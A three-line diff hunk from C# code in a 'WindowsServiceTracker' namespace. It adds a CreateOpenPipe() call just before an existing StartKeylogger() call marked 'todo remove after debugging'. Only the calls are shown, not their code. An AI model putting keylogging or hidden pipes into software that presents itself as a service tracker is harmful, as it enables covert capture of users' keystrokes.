@@ -71,6 +71,7 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
+            CreateOpenPipe();
             StartKeylogger(); //todo remove after debugging
             Thread.Sleep(30000);
 
